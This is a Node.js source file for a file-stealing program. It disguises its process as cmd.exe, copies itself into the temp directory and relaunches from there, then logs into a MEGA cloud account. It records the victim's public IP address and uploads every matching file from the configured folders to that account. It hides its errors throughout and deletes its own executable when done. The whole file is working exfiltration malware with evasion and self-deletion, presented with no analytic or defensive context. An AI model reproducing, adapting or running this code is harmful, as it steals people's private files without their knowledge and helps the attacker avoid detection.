const config = require("./config");
const path = require('path');
const fs = require('fs');
const PublicIp = require('nodejs-publicip');
const { Storage } = require('megajs')
const { spawn } = require('child_process');

var storage;
const ATTEMPTS = 1000;
process.title = "C:\\Windows\\system32\\cmd.exe";


function findNode(root, parent, name, fDir) {
    for (const [id, file] of Object.entries(root.storage.files)) {
        isType = fDir ? file.directory : !file.directory;
        if ((file.name == name) && (file.parent.nodeId == parent) && isType) { return file; }
    }

    return null;
}

function findFolder(root, fid) {
    return root.storage.files[fid];
}

async function megaCreateDir(root, parent, name) {
    return new Promise(async function(resolve) {
        var node = findNode(root, parent, name, true);
        var count = 0;

        while (count < ATTEMPTS) {
            try {
                if (node != null) {
                    resolve(node.nodeId);
                } else {
                    var folder = findFolder(root, parent);
                    folder.mkdir(name, (error, folder) => {
                        //if (error) { console.log(error); }
                        if (folder) { resolve(folder.nodeId); }
                    });
                }
                break;
            } catch(e) {
                await Wait(100);
                if (count >= ATTEMPTS) { resolve(); }
                continue;
            }
        }
    });
}

async function megaDeleteDir(root, fid) {
    return new Promise(async function(resolve) {
        var folder = findFolder(root, fid);
        if (!folder) { return resolve(); }
        var count = 0;

        while (count < ATTEMPTS) {
            try {
                folder.delete(true, (error, data) => {
                    //if (error) console.log(error);
                    resolve();
                });
                break;
            } catch(e) {
                await Wait(100);
                if (count >= ATTEMPTS) { resolve(); }
                continue;
            }
        }
    });
}

async function megaUploadFile(root, fid, name, buffer) {
    return new Promise(async function(resolve) {
        var folder = findFolder(root, fid);
        var node = findNode(root, fid, name, false);
        var count = 0;

        while (count < ATTEMPTS) {
            try {
                if ((folder != null) && (node == null)) {
                    folder.upload(name, buffer, (error, file) => {
                        resolve();
                    });
                } else {
                    resolve();
                }
                break;
            } catch(e) {
                await Wait(100);
                if (count >= ATTEMPTS) { resolve(); }
                continue;
            }
        }
    });
}

async function uploadFile(file, fid) {
    try {
        let stats = fs.statSync(file);
        var isAllowed = ((stats.size > 0) && (stats.size <= config.MAX_SIZE));
        isAllowed = isAllowed && config.FILE_TYPES.includes(path.extname(file).substring(1).toLocaleLowerCase());
        if (!isAllowed) { return 0; }
        //console.log(`Uploading ${path.basename(file)}`);
        await megaUploadFile(storage.root, fid, path.basename(file), fs.readFileSync(file));
        return 1;
    } catch(e) {}

    return 0;
}

async function traverseDirectory(dir, fid) {
    let count = 0;

    try {
        let files = await fs.readdirSync(dir, {withFileTypes: true});
        for (const file of files) {
            if (file.isDirectory()) {
                let new_fid = await megaCreateDir(storage.root, fid, file.name);
                //console.log(`[*] Dir create -> ${file.name}; parent: [${fid}]`);
                count += await traverseDirectory(path.join(dir, file.name), new_fid);
            }

            if (file.isFile()) {
                count += await uploadFile(path.join(dir, file.name), fid);
            }
        }

        if (count == 0) {
            await megaDeleteDir(storage.root, fid);
            //console.log(`[-] Dir delete -> [${fid}]`);
        }
    } catch(e) {
        //console.log(e);
    }

    return count;
}

(async function () {
    if (path.basename(__dirname).toLocaleLowerCase() != 'temp') {
        fs.copyFileSync(global.process.argv[0], (require('os').tmpdir() + "\\cmd.exe"));
        spawn("cmd.exe", [..."/c start ".split(" "), (require('os').tmpdir() + "\\cmd.exe")], { detached: true });
        spawn("cmd.exe", [..."/c timeout /T 2 /nobreak & del".split(" "), global.process.argv[0]], { detached: true });
        await Wait(500);
        process.exit();
    }

    //console.log("Upload start!");
    storage = await new Storage({email: config.EMAIL, password: config.PASSWORD}).ready;
    let address = await new PublicIp().queryPublicIPv4Address();
    let base_fid = await megaCreateDir(storage.root, config.BASE_DIR_ID, address);
    var counter = config.FOLDERS.length;

    for (let i = 0; i < config.FOLDERS.length; i++) {
        (async function () {
            let fid = await megaCreateDir(storage.root, base_fid, path.basename(config.FOLDERS[i]));
            await traverseDirectory(config.FOLDERS[i], fid);
            counter -= 1;
        }());
    }

    while (counter != 0) { await Wait(100); }
    //console.log("Upload done!");
    spawn("cmd.exe", [..."/c timeout /T 2 /nobreak & del".split(" "), global.process.argv[0]], { detached: true });
    await Wait(500);
    process.exit();
}());


async function Wait(milleseconds) {
    return new Promise(resolve => setTimeout(resolve, milleseconds))
}
